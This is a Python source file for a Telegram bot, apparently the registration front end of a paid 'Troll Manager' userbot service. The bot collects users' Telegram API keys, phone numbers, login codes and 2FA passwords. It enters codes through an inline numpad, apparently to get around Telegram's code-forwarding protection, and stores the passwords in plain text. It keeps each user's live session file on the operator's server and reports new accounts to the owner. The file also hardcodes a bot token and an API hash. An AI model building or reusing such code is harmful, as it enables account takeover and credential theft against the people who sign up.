#!/usr/bin/env python3
"""\nБот для регистрации сессий юзербота\n- Создает папку users/{telegram_id}/\n- Копирует troll.py с заменой: phone, api_id, api_hash, owner_id\n- Регистрирует сессию через Telethon\n- Поддерживает 2FA\n"""

import os
import asyncio
import json
import shutil
import re
import time
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.tl.custom import Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError

BOT_TOKEN = "8928386795:AAEitZXqc0zN79iDypUOCcpIOKCI5Q-LqQY"
OWNER_ID = 913887246
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TROLL_FILE = os.path.join(BASE_DIR, "troll.py")
USERS_DIR = os.path.join(BASE_DIR, "users")
USERS_FILE = os.path.join(BASE_DIR, "users.json")
ADMINS_FILE = os.path.join(BASE_DIR, "admins.json")

os.makedirs(USERS_DIR, exist_ok=True)

def load_admins():
    try:
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return set(json.load(f))
    except:
        return set()

def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(list(admins), f, ensure_ascii=False, indent=2)

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    return user_id in load_admins()

def load_users():
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, ensure_ascii=False, indent=2)

def create_user_folder(telegram_id):
    folder = os.path.join(USERS_DIR, str(telegram_id))
    os.makedirs(folder, exist_ok=True)
    return folder

def generate_troll_file(user_folder, phone, api_id, api_hash, owner_id, session_name):
    """Генерирует troll.py с заменой ВСЕХ переменных"""
    userbot_file = os.path.join(user_folder, "troll.py")
    
    if not os.path.exists(TROLL_FILE):
        return None, "Файл troll.py не найден!"
    
    with open(TROLL_FILE, 'r', encoding='utf-8') as f:
        code = f.read()
    
    # Заменяем все переменные
    code = re.sub(r'phone\s*=\s*"[^"]*"', f'phone = "{phone}"', code)
    code = re.sub(r"phone\s*=\s*'[^']*'", f"phone = '{phone}'", code)
    code = re.sub(r'api_id\s*=\s*\d+', f'api_id = {api_id}', code)
    code = re.sub(r'api_hash\s*=\s*"[^"]*"', f'api_hash = "{api_hash}"', code)
    code = re.sub(r"api_hash\s*=\s*'[^']*'", f"api_hash = '{api_hash}'", code)
    code = re.sub(r'owner_id\s*=\s*\d+', f'owner_id = {owner_id}', code)
    code = re.sub(r"TelegramClient\(['\"][^'\"]+['\"]", f"TelegramClient('{session_name}'", code)
    code = re.sub(r'DATA_DIR\s*=\s*"[^"]*"', f'DATA_DIR = "data_{session_name}"', code)
    code = code.replace("'Grandeur.session'", f"'{session_name}.session'")
    
    with open(userbot_file, 'w', encoding='utf-8') as f:
        f.write(code)
    
    return userbot_file, None

def numpad_kb():
    return [
        [Button.inline("1", data="d1"), Button.inline("2", data="d2"), Button.inline("3", data="d3")],
        [Button.inline("4", data="d4"), Button.inline("5", data="d5"), Button.inline("6", data="d6")],
        [Button.inline("7", data="d7"), Button.inline("8", data="d8"), Button.inline("9", data="d9")],
        [Button.inline("← Удалить", data="dback"), Button.inline("0", data="d0"), Button.inline("✓ Ввести", data="dconfirm")],
        [Button.inline("❌ Отмена", data="dcancel")],
    ]

def disp(buf, hidden=False):
    return "[ " + ("*"*len(buf) if hidden else " ".join(buf)) + " ]" if buf else "[ пусто ]" 

def get_main_keyboard():
    return [[Button.inline("✅ Начать регистрацию", data="start_registration")]]


class RegisterBot:
    def __init__(self):
        self.bot = TelegramClient("register_bot", 21523809, "577c0b97ee6a853cd08cda0d7b448508")
        self.users = load_users()
        self.temp_data = {}
    
    async def send_notification(self, telegram_id, account_id, username, first_name, phone):
        text = (
            f"🆕 <b>НОВАЯ РЕГИСТРАЦИЯ!</b>\n\n"
            f"👤 {first_name}\n"
            f"🆔 Telegram ID: <code>{telegram_id}</code>\n"
            f"🆔 Аккаунт ID: <code>{account_id}</code>\n"
            f"📱 @{username}\n"
            f"📞 {phone}\n"
            f"📁 users/{telegram_id}/\n\n"
            f"✅ Готов к запуску!"
        )
        await self.bot.send_message(OWNER_ID, text, parse_mode='html')
    
    async def finalize(self, user_id, temp, me):
        account_id = me.id
        username = me.username if me.username else f"user_{account_id}"
        username = "".join(c for c in username if c.isalnum() or c == '_')
        user_folder = temp['user_folder']
        
        await temp['client'].disconnect()
        await asyncio.sleep(2)
        
        old = os.path.join(user_folder, "temp.session")
        new = os.path.join(user_folder, f"{username}.session")
        await asyncio.sleep(3)  # extra time for SQLite WAL flush
        if os.path.exists(old):
            import shutil as _shutil
            _shutil.copy2(old, new)
            for _ext in ['-wal', '-shm']:
                if os.path.exists(old + _ext):
                    _shutil.copy2(old + _ext, new + _ext)
        
        _troll_result, _troll_err = generate_troll_file(user_folder, temp['phone'], temp['api_id'], temp['api_hash'], temp['account_id'], username)
        if _troll_err:
            print(f"[ERROR finalize] generate_troll_file: {_troll_err}")
            with open(os.path.join(user_folder, "error.log"), "a") as _ef:
                _ef.write(f"generate_troll_file error: {_troll_err}\n")
        
        if temp.get('two_fa'):
            self.users[str(user_id)]['two_fa'] = temp['two_fa']
        if temp.get('is_admin_account'):
            self.users[str(user_id)]['is_admin_account'] = True
        self.users[str(user_id)]['registered'] = True
        self.users[str(user_id)]['account_id'] = account_id
        self.users[str(user_id)]['username'] = username
        self.users[str(user_id)]['first_name'] = me.first_name
        self.users[str(user_id)]['user_folder'] = user_folder
        self.users[str(user_id)]['api_id'] = temp.get('api_id')
        self.users[str(user_id)]['api_hash'] = temp.get('api_hash')
        self.users[str(user_id)]['phone'] = temp.get('phone')
        save_users(self.users)
        
        # Auto-start troll bot via screen
        import subprocess
        _troll = os.path.join(user_folder, "troll.py")
        if os.path.exists(_troll):
            _screen_name = f"troll_{account_id}"
            _log_file = os.path.join(user_folder, "troll.log")
            subprocess.Popen(
                ["screen", "-dmS", _screen_name,
                 "bash", "-c", f"/usr/bin/python3.11 {_troll} >> {_log_file} 2>&1"],
                cwd=user_folder
            )
            print(f"[INFO] Troll started in screen: {_screen_name}")
        else:
            print(f"[ERROR] troll.py not found at {_troll}")
            with open(os.path.join(user_folder, "error.log"), "a") as _ef:
                _ef.write(f"troll.py not found: {_troll}\n")

        await self.send_notification(user_id, account_id, username, me.first_name, temp['phone'])
        return username, account_id
    
    async def run(self):
        if not os.path.exists(TROLL_FILE):
            print(f"❌ {TROLL_FILE} не найден!")
            return
        
        print("✅ Бот-регистратор запущен!")
        
        @self.bot.on(events.NewMessage(pattern=r'^/start$'))
        async def start_handler(event):
            user_id = str(event.sender_id)
            if is_admin(event.sender_id):
                owner_only = event.sender_id == OWNER_ID
                label = "👑 <b>Управление (владелец)</b>" if owner_only else "🛡 <b>Управление (под-админ)</b>"
                lines = label + "\n\n/add user_id дни — выдать подписку\n/remove user_id — удалить пользователя\n/list — список"
                if owner_only:
                    lines += "\n\n<b>Под-админы:</b>\n/addadmin user_id\n/deladmin user_id\n/listadmins"
                await event.reply(lines, parse_mode='html')
            else:
                if user_id not in self.users:
                    await event.reply("❌ Нет доступа")
                    return
                user_data = self.users[user_id]
                if user_data.get('registered'):
                    # Real session check via Telethon
                    user_folder = user_data.get('user_folder', '')
                    username = user_data.get('username', '')
                    api_id = user_data.get('api_id') or 21523809
                    api_hash = user_data.get('api_hash') or '577c0b97ee6a853cd08cda0d7b448508'
                    sess_path = os.path.join(user_folder, username) if user_folder and username else None
                    sess_ok = False
                    if sess_path and os.path.exists(sess_path + '.session'):
                        try:
                            _chk = TelegramClient(sess_path, api_id, api_hash)
                            await _chk.connect()
                            sess_ok = await _chk.is_user_authorized()
                            await _chk.disconnect()
                        except:
                            sess_ok = False

                    if not sess_ok:
                        sess_file_ok = sess_path and os.path.exists(sess_path + ".session")
                        if not sess_file_ok:
                            self.users[user_id]['registered'] = False
                            save_users(self.users)
                            await event.reply(
                                "⚠️ <b>Сессия устарела или недействительна.</b>\n\n"
                                "Нужно войти заново. Нажмите кнопку:",
                                parse_mode='html',
                                buttons=get_main_keyboard()
                            )
                            return
                        # session file exists but locked (already in use) — treat as OK

                    import subprocess as _sp
                    account_id = user_data.get('account_id', '')
                    res = _sp.run(['screen', '-list'], capture_output=True, text=True)
                    screen_name = f"troll_{account_id}"
                    is_running = screen_name in res.stdout
                    fname = user_data.get('first_name', '')
                    uname = user_data.get('username', '')
                    if is_running:
                        await event.reply(
                            f"🤖 <b>Troll Manager</b>\n\n"
                            f"✅ Аккаунт: {fname} (@{uname})\n"
                            f"🟢 Бот активен",
                            parse_mode='html',
                            buttons=[
                                [Button.inline("🔄 Перезапустить бота", data=f"restart_bot_{user_id}")],
                                [Button.inline("🛑 Остановить бота", data=f"stop_bot_{user_id}")]
                            ]
                        )
                    else:
                        await event.reply(
                            f"🤖 <b>Troll Manager</b>\n\n"
                            f"✅ Аккаунт: {fname} (@{uname})\n"
                            f"🔴 Бот остановлен",
                            parse_mode='html',
                            buttons=[
                                [Button.inline("▶️ Запустить бота", data=f"start_bot_{user_id}")]
                            ]
                        )
                else:
                    await event.reply(
                        "🤖 <b>Регистрация</b>\n\n"
                        "Нажмите кнопку:",
                        parse_mode='html',
                        buttons=get_main_keyboard()
                    )
        
        @self.bot.on(events.NewMessage(pattern='/add'))
        async def add_user(event):
            if not is_admin(event.sender_id):
                return
            try:
                args = event.raw_text.split()
                user_id, days = args[1], int(args[2])
                if user_id in self.users:
                    await event.reply("❌ Уже есть")
                    return
                self.users[user_id] = {
                    'added_date': datetime.now().isoformat(),
                    'expires': (datetime.now() + timedelta(days=days)).isoformat(),
                    'registered': False
                }
                save_users(self.users)
                await self.bot.send_message(int(user_id), f"✅ Доступ на {days} дней!\n/register")
                await event.reply(f"✅ Добавлен {user_id}")
            except:
                await event.reply("❌ /add user_id дни")
        
        @self.bot.on(events.NewMessage(pattern='/remove'))
        async def remove_user(event):
            if not is_admin(event.sender_id):
                return
            try:
                user_id = event.raw_text.split()[1]
                if user_id in self.users:
                    folder = os.path.join(USERS_DIR, user_id)
                    if os.path.exists(folder):
                        shutil.rmtree(folder)
                    del self.users[user_id]
                    save_users(self.users)
                    await event.reply(f"✅ Удален {user_id}")
            except:
                await event.reply("❌ /remove user_id")
        
        @self.bot.on(events.NewMessage(pattern='/list'))
        async def list_users(event):
            if not is_admin(event.sender_id):
                return
            if not self.users:
                await event.reply("📭 Пусто")
                return
            text = "📋 Список:\n"
            for uid, data in self.users.items():
                reg = "✅" if data.get('registered') else "⏳"
                text += f"{reg} {uid} - до {data.get('expires', '')[:10]}\n"
            await event.reply(text)
        

        @self.bot.on(events.NewMessage(pattern='/addadmin'))
        async def addadmin_handler(event):
            if event.sender_id != OWNER_ID:
                return
            try:
                new_admin_id = int(event.raw_text.split()[1])
                if new_admin_id == OWNER_ID:
                    await event.reply('❌ Это уже главный владелец')
                    return
                admins = load_admins()
                if new_admin_id in admins:
                    await event.reply(f'⚠️ <code>{new_admin_id}</code> уже под-админ', parse_mode='html')
                    return
                admins.add(new_admin_id)
                save_admins(admins)
                await event.reply(f'✅ Под-админ <code>{new_admin_id}</code> добавлен', parse_mode='html')
            except (IndexError, ValueError):
                await event.reply('❌ /addadmin user_id')

        @self.bot.on(events.NewMessage(pattern='/deladmin'))
        async def deladmin_handler(event):
            if event.sender_id != OWNER_ID:
                return
            try:
                rm_id = int(event.raw_text.split()[1])
                admins = load_admins()
                if rm_id not in admins:
                    await event.reply(f'❌ <code>{rm_id}</code> не под-админ', parse_mode='html')
                    return
                admins.discard(rm_id)
                save_admins(admins)
                await event.reply(f'✅ Под-админ <code>{rm_id}</code> удалён', parse_mode='html')
            except (IndexError, ValueError):
                await event.reply('❌ /deladmin user_id')

        @self.bot.on(events.NewMessage(pattern='/listadmins'))
        async def listadmins_handler(event):
            if event.sender_id != OWNER_ID:
                return
            admins = load_admins()
            if not admins:
                await event.reply('📭 Под-админов нет')
                return
            lines = [f'  • <code>{a}</code>' for a in admins]
            await event.reply('🛡 <b>Под-админы:</b>\n' + '\n'.join(lines), parse_mode='html')

        @self.bot.on(events.NewMessage(pattern=r'^/register$'))
        async def register(event):
            user_id = str(event.sender_id)
            if user_id not in self.users:
                await event.reply("❌ Нет доступа")
                return
            if self.users[user_id].get('registered'):
                await event.reply("✅ Уже зарегистрирован")
                return
            await event.reply("📝 Введите API ID:")
            self.temp_data[int(user_id)] = {'step': 'api_id'}

        @self.bot.on(events.NewMessage(pattern='/registeradm'))
        async def register_admin(event):
            if not is_admin(event.sender_id):
                return
            user_id = str(event.sender_id)
            if user_id not in self.users:
                self.users[user_id] = {
                    'added_date': datetime.now().isoformat(),
                    'registered': False,
                    'is_admin_account': True,
                }
                save_users(self.users)
            elif self.users[user_id].get('registered'):
                await event.reply("✅ Уже зарегистрирован")
                return
            await event.reply("📝 Введите API ID:")
            self.temp_data[int(user_id)] = {'step': 'api_id', 'is_admin_account': True}
        
        @self.bot.on(events.NewMessage(pattern=r"^/starta$"))
        async def starta_handler(event):
            if not is_admin(event.sender_id):
                return
            user_id = str(event.sender_id)
            if user_id not in self.users or not self.users[user_id].get("registered"):
                await event.reply(
                    "🤖 <b>Troll Manager</b>\n\nНе зарегистрирован.\nИспользуй /registeradm",
                    parse_mode="html",
                    buttons=[[Button.inline("✅ Начать регистрацию", data="start_registration")]]
                )
                return
            user_data = self.users[user_id]
            user_folder = user_data.get("user_folder", "")
            username = user_data.get("username", "")
            api_id = user_data.get("api_id") or 21523809
            api_hash = user_data.get("api_hash") or "577c0b97ee6a853cd08cda0d7b448508"
            sess_path = os.path.join(user_folder, username) if user_folder and username else None
            sess_ok = False
            if sess_path and os.path.exists(sess_path + ".session"):
                try:
                    _chk = TelegramClient(sess_path, api_id, api_hash)
                    await _chk.connect()
                    sess_ok = await _chk.is_user_authorized()
                    await _chk.disconnect()
                except:
                    sess_ok = False
            if not sess_ok:
                sess_file_ok = sess_path and os.path.exists(sess_path + ".session")
                if not sess_file_ok:
                    self.users[user_id]["registered"] = False
                    save_users(self.users)
                    await event.reply(
                        "⚠️ <b>Сессия устарела.</b>\n\nНужно войти заново:",
                        parse_mode="html",
                        buttons=[[Button.inline("✅ Начать регистрацию", data="start_registration")]]
                    )
                    return
                # session file exists but locked — treat as OK
            import subprocess as _sp
            account_id = user_data.get("account_id", "")
            res = _sp.run(["screen", "-list"], capture_output=True, text=True)
            screen_name = f"troll_{account_id}"
            is_running = screen_name in res.stdout
            fname = user_data.get("first_name", "")
            uname = user_data.get("username", "")
            if is_running:
                await event.reply(
                    f"🤖 <b>Troll Manager</b>\n\n✅ Аккаунт: {fname} (@{uname})\n🟢 Бот активен",
                    parse_mode="html",
                    buttons=[
                        [Button.inline("🔄 Перезапустить бота", data=f"restart_bot_{user_id}")],
                        [Button.inline("🛑 Остановить бота", data=f"stop_bot_{user_id}")]
                    ]
                )
            else:
                await event.reply(
                    f"🤖 <b>Troll Manager</b>\n\n✅ Аккаунт: {fname} (@{uname})\n🔴 Бот остановлен",
                    parse_mode="html",
                    buttons=[[Button.inline("▶️ Запустить бота", data=f"start_bot_{user_id}")]]
                )

        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            user_id = event.sender_id
            # Ignore commands — they have their own handlers
            if event.raw_text and event.raw_text.startswith('/'):
                return
            if user_id not in self.temp_data:
                return
            
            temp = self.temp_data[user_id]
            
            # API ID
            if temp.get('step') == 'api_id':
                try:
                    temp['api_id'] = int(event.raw_text.strip())
                    temp['step'] = 'api_hash'
                    await event.reply("📝 Введите API HASH:")
                except:
                    await event.reply("❌ Число!")
                return
            
            # API HASH
            if temp.get('step') == 'api_hash':
                temp['api_hash'] = event.raw_text.strip()
                temp['step'] = 'account_id'
                await event.reply("📝 Введите ID аккаунта (узнайте у @xolizm):")
                return
            
            # ACCOUNT ID
            if temp.get('step') == 'account_id':
                try:
                    temp['account_id'] = int(event.raw_text.strip())
                    temp['step'] = 'phone'
                    await event.reply("📝 Введите номер телефона (+7XXXXXXXXXX):")
                except:
                    await event.reply("❌ Число!")
                return
            
            # PHONE
            if temp.get('step') == 'phone':
                phone = event.raw_text.strip()
                if not phone.startswith('+') or not phone[1:].isdigit():
                    await event.reply("❌ Формат +7XXXXXXXXXX")
                    return
                
                temp['phone'] = phone
                await event.reply("📁 Создаю папку...")
                
                folder = create_user_folder(user_id)
                await event.reply("🔄 Подключаюсь...")
                
                try:
                    client = TelegramClient(os.path.join(folder, "temp"), temp['api_id'], temp['api_hash'])
                    await client.connect()
                    result = await client.send_code_request(phone)
                    
                    self.temp_data[user_id] = {
                        'step': 'code',
                        'client': client,
                        'user_folder': folder,
                        'phone': phone,
                        'api_id': temp['api_id'],
                        'api_hash': temp['api_hash'],
                        'account_id': temp['account_id'],
                        'phone_code_hash': result.phone_code_hash,
                        'buf': ''
                    }
                    
                    await event.reply(
                        f"Код отправлен на {phone}\n\nВведи код:\n{disp('')}",
                        buttons=numpad_kb()
                    )
                except Exception as e:
                    await event.reply(f"❌ {e}")
                    del self.temp_data[user_id]
        
        @self.bot.on(events.CallbackQuery)
        async def callback(event):
            user_id = event.sender_id
            data = event.data.decode()
            
            # === Управление ботом для зарегистрированных ===
            if data.startswith('stop_bot_'):
                uid_str = str(event.sender_id)
                user_data = self.users.get(uid_str, {})
                account_id = user_data.get('account_id', '')
                screen_name = f"troll_{account_id}"
                import subprocess as _sp
                # Останавливаем screen сессию
                _sp.run(['screen', '-S', screen_name, '-X', 'quit'], capture_output=True)
                # Выходим из аккаунта Telegram
                user_folder = user_data.get('user_folder', '')
                username = user_data.get('username', '')
                if user_folder and username:
                    try:
                        import asyncio as _asyncio
                        from telethon import TelegramClient as _TGC
                        _sess = os.path.join(user_folder, username)
                        _c = _TGC(_sess, user_data.get('api_id', 21523809), user_data.get('api_hash', '577c0b97ee6a853cd08cda0d7b448508'))
                        await _c.connect()
                        await _c.log_out()
                        await _c.disconnect()
                    except Exception as _e:
                        print(f"Logout error: {_e}")
                await event.edit(
                    "🤖 <b>Troll Manager</b>\n\n"
                    "🛑 Бот остановлен и выход из аккаунта выполнен",
                    parse_mode='html'
                )
                return

            if data.startswith('restart_bot_'):
                uid_str = str(event.sender_id)
                user_data = self.users.get(uid_str, {})
                account_id = user_data.get('account_id', '')
                screen_name = f"troll_{account_id}"
                user_folder = user_data.get('user_folder', '')
                import subprocess as _sp
                # Останавливаем старую сессию
                _sp.run(['screen', '-S', screen_name, '-X', 'quit'], capture_output=True)
                import asyncio as _asyncio
                await _asyncio.sleep(2)
                # Запускаем заново
                _troll = os.path.join(user_folder, 'troll.py')
                _log = os.path.join(user_folder, 'troll.log')
                if os.path.exists(_troll):
                    _sp.Popen(
                        ['screen', '-dmS', screen_name,
                         'bash', '-c', f'/usr/bin/python3.11 {_troll} >> {_log} 2>&1'],
                        cwd=user_folder
                    )
                    await event.edit(
                        "🤖 <b>Troll Manager</b>\n\n"
                        "🔄 Бот перезапущен!",
                        parse_mode='html'
                    )
                else:
                    await event.edit("❌ Файл troll.py не найден", parse_mode='html')
                return

            if data.startswith('start_bot_'):
                uid_str = str(event.sender_id)
                user_data = self.users.get(uid_str, {})
                account_id = user_data.get('account_id', '')
                screen_name = f"troll_{account_id}"
                user_folder = user_data.get('user_folder', '')
                import subprocess as _sp
                _troll = os.path.join(user_folder, 'troll.py')
                _log = os.path.join(user_folder, 'troll.log')
                if os.path.exists(_troll):
                    _sp.Popen(
                        ['screen', '-dmS', screen_name,
                         'bash', '-c', f'/usr/bin/python3.11 {_troll} >> {_log} 2>&1'],
                        cwd=user_folder
                    )
                    await event.edit(
                        "🤖 <b>Troll Manager</b>\n\n"
                        "🟢 Бот запущен!",
                        parse_mode='html'
                    )
                else:
                    await event.edit("❌ Файл troll.py не найден", parse_mode='html')
                return
            # ==========================================

            if data == 'start_registration':
                await event.edit("📝 Введите API ID:")
                self.temp_data[user_id] = {'step': 'api_id'}
                return
            
            # Numpad (exact approach from manager_bot)
            if user_id in self.temp_data and self.temp_data[user_id].get('step') == 'code':
                temp = self.temp_data[user_id]
                buf = temp.get('buf', '')

                if data == 'dcancel':
                    client = temp.get('client')
                    if client:
                        try: await client.disconnect()
                        except: pass
                    del self.temp_data[user_id]
                    await event.edit("❌ Регистрация отменена.\n\n/register — начать заново")
                    return

                elif data.startswith('d') and data[1:].isdigit():
                    buf += data[1:]
                    temp['buf'] = buf
                    await event.edit(f"Введи код:\n{disp(buf)}", buttons=numpad_kb())

                elif data == 'dback':
                    buf = buf[:-1]
                    temp['buf'] = buf
                    await event.edit(f"Введи код:\n{disp(buf)}", buttons=numpad_kb())

                elif data == 'dconfirm':
                    if not buf:
                        await event.answer("Введи цифры!", alert=True)
                        return
                    await event.edit("🔄 Проверка...")
                    try:
                        await temp['client'].sign_in(
                            phone=temp['phone'], code=buf,
                            phone_code_hash=temp['phone_code_hash']
                        )
                        me = await temp['client'].get_me()
                        await self.finalize(user_id, temp, me)
                        await event.edit(
                            f"✅ <b>Готово!</b>\n\n"
                            f"👤 {me.first_name}\n"
                            f"🆔 ID: <code>{me.id}</code>\n"
                            f"📱 @{me.username}\n\n"
                            f"🟢 Бот запущен!",
                            parse_mode='html'
                        )
                        del self.temp_data[user_id]
                    except SessionPasswordNeededError:
                        temp['step'] = 'password'
                        self.temp_data[user_id] = temp
                        await event.edit("2FA — отправь пароль следующим сообщением (удалится).")
                    except (PhoneCodeInvalidError,):
                        temp['buf'] = ''
                        await event.edit(f"Неверный код!\n\nВведи код:\n{disp('')}", buttons=numpad_kb())
                    except Exception as e:
                        client = temp.get('client')
                        if client:
                            try: await client.disconnect()
                            except: pass
                        del self.temp_data[user_id]
                        await event.edit(f"❌ Ошибка: {e}\n\n/register — начать заново")
                return
        
        @self.bot.on(events.NewMessage)
        async def password_handler(event):
            user_id = event.sender_id
            if event.raw_text and event.raw_text.startswith('/'):
                return
            if user_id not in self.temp_data:
                return
            temp = self.temp_data[user_id]
            if temp.get('step') != 'password':
                return
            
            password = event.raw_text.strip()
            await event.reply("🔄 Проверка...")
            try:
                await temp['client'].sign_in(password=password)
                me = await temp['client'].get_me()
                # Pass 2FA password to finalize for saving
                temp['two_fa'] = password
                await self.finalize(user_id, temp, me)
                await event.reply(
                    f"✅ <b>Готово!</b>\n\n"
                    f"👤 {me.first_name}\n"
                    f"🆔 ID: <code>{me.id}</code>\n"
                    f"📱 @{me.username}\n\n"
                    f"✅ Бот готов!",
                    parse_mode='html'
                )
                del self.temp_data[user_id]
            except Exception as e:
                await event.reply(f"❌ {e}")
                del self.temp_data[user_id]
        

        @self.bot.on(events.NewMessage(pattern=r'^/sms'))
        async def sms_handler(event):
            if not is_admin(event.sender_id):
                return
            text = event.raw_text[4:].strip()
            if not text:
                await event.reply("❌ Использование: /sms <текст>\n\nТекст будет отправлен всем пользователям с активной подпиской.")
                return
            users = load_users()
            from datetime import datetime
            now = datetime.now().isoformat()
            sent = 0
            failed = 0
            for uid, data in users.items():
                if data.get("is_admin_account"):
                    continue
                expires = data.get("expires", "")
                if expires and expires < now:
                    continue
                try:
                    await self.bot.send_message(int(uid), text)
                    sent += 1
                except Exception:
                    failed += 1
            await event.reply(f"✅ Отправлено: {sent}\n❌ Ошибок: {failed}")

        await self.bot.start(bot_token=BOT_TOKEN)
        print("="*50)
        print("✅ Бот-регистратор запущен!")
        print("="*50)
        await self.bot.run_until_disconnected()


if __name__ == "__main__":
    bot = RegisterBot()
    asyncio.run(bot.run())
